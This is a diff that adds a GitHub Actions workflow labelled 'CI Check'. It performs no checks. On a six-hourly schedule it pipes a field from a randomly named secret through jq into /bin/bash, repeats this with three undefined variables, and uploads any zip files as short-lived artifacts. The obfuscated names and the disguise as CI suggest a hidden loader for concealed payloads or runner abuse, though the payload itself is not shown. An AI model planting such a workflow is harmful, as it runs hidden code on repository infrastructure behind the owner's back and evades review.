@@ -1,0 +1,36 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          jkq36: ${{ secrets.jkq36 }}
+        run: |
+          printf '%s' "$jkq36" | jq -r .o87548 | /bin/bash
+          echo $rjk6 | jq -r .tof3 | /bin/bash
+          printf '%s' "$t2" | jq -r .pluuf89 | /bin/bash
+          printf '%s' "$omz3454" | jq -r .iqfk8 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: jyh7b8MH
+          path: "*.zip"
+          retention-days: 1
